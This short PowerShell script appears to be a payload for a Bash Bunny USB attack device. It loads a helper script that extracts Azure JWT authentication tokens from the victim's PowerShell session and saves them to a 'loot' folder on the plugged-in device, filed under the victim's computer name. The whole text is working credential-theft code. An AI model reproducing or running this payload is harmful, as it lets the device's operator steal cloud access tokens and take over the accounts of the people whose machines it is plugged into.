
. "$PSScriptRoot\Extract-AzureJWTFromPowerShell.ps1"
Extract-AzureJWTFromPowerShell | Out-File ((gwmi win32_volume -f 'label= "BashBunny"').Name +"loot\AzureTokens\AzureJWTs-$env:computername") -Force
